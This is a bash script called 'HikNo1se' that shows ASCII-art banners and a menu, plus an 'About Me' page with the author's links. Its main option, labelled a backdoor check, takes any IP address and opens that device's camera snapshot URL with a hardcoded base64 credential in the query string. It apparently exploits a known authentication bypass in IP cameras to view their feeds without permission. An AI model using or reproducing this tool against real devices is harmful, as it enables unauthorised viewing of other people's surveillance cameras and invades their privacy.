#!/bin/bash 

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"
clear
read -p "$RED                    Welcome to HikNo1se Please $WHITE Enter Your Name:$REDBG " Name
tput sgr0
clear
echo "$RED                    /\  /(_) | __ /\ \ \___ / |"
sleep 0.1
echo "$WHITE                   / /_/ / | |/ //  \/ / _ \| / __|/ _ "
sleep 0.1
echo "$RED                  / __  /| |   </ /\  / (_) | \__ \  __/"
sleep 0.1
echo "$WHITE                  \/ /_/ |_|_|\_\_\ \/ \___/|_|___/\___|"
sleep 1
clear
echo "$RED            | | | (_) |  | \ | |     /  |"
sleep 0.1
echo "$WHITE            | |_| |_| | _|  \| | ___  | |"
sleep 0.1
echo "$RED            |  _  | | |/ /     |/ _ \ | |/ __|/ _  "
sleep 0.1
echo "$WHITE            | | | | |   <| |\  | (_) || |\__ \  __/"
sleep 0.1
echo "$RED            \_| |_/_|_|\_\_| \_/\___/\___/___/\___|"
sleep 1
clear
echo "$RED Welcome To HikNo1se$WHITE $Name"
sleep 0.3
clear
echo "                         $RED Welcome To HikNo1se$WHITE $Name"
sleep 0.3
clear
echo "                                                      $RED Welcome To HikNo1se$WHITE $Name"
sleep 0.3
clear
echo "$RED                         / / / (_) /__/ | / /___ <  /"
sleep 0.2
echo "                        / /_/ / / //_/  |/ / __ \/ / ___/ _ "
sleep 0.2
echo "$WHITE                       / __  / / ,< / /|  / /_/ / (__  )  __/"
sleep 0.2
echo "                      /_/ /_/_/_/|_/_/ |_/\____/_/____/\___/"
echo "                           $RED Welcome To HikNo1se$WHITE ($Name)"
echo ""
sleep 0.2
echo "                     $RED 1:$WHITE Check ip for Backdoor vulnerabilities"
sleep 0.2
echo "                               $RED 2:$WHITE About Me (no1se)"      
echo ""
read -p "                     $Name $RED Please Select an option:$WHITE "     

startt() {
    clear
    echo "$RED                         / / / (_) /__/ | / /___ <  /"
    echo "                        / /_/ / / //_/  |/ / __ \/ / ___/ _ "
    echo "$WHITE                       / __  / / ,< / /|  / /_/ / (__  )  __/"
    echo "                      /_/ /_/_/_/|_/_/ |_/\____/_/____/\___/"
    echo "                           $RED Welcome To HikNo1se$WHITE ($Name)"
    echo ""
    read -p "                     $WHITE $Name $RED Please Enter the Ip you want to check:$WHITE " Ip
    google-chrome http://$Ip/onvif-http/snapshot?auth=YWRtaW46MTEK
    clear
    startt
}

about() {
    clear
    echo "$RED                         / / / (_) /__/ | / /___ <  /"
    echo "                        / /_/ / / //_/  |/ / __ \/ / ___/ _ "
    echo "$WHITE                       / __  / / ,< / /|  / /_/ / (__  )  __/"
    echo "                      /_/ /_/_/_/|_/_/ |_/\____/_/____/\___/"
    echo "                           $RED Welcome To HikNo1se$WHITE ($Name)"
    echo ""
    echo "$BLUE I love only old school rap I hate new school I think is garbage, I'm an editor (Ae, Pr, Ps), I know HTML/CSS/Bash scripting/Linux/Hacking/student at tryhackme.com, And Learning Cyber security
and love planes , playing alot of plane simulators
The language I speak: English/Hebrew"
    echo "$WHITE Links :"
    echo "$RED My Website:$WHITE https://no1seplayground.netlify.app/"
    echo "$RED My YouTube channel:$WHITE https://www.youtube.com/channel/UCfBQbNKVeCHtwNP5fzXeBRg/videos"
    echo "$RED My instagram Page:$WHITE https://www.instagram.com/mika_and_no1se/"
    echo "Run the script again to go Back $Name"
}

    case $REPLY in
        1 | 01)
clear
startt;;
        2 | 02)
about;;
*)
esac
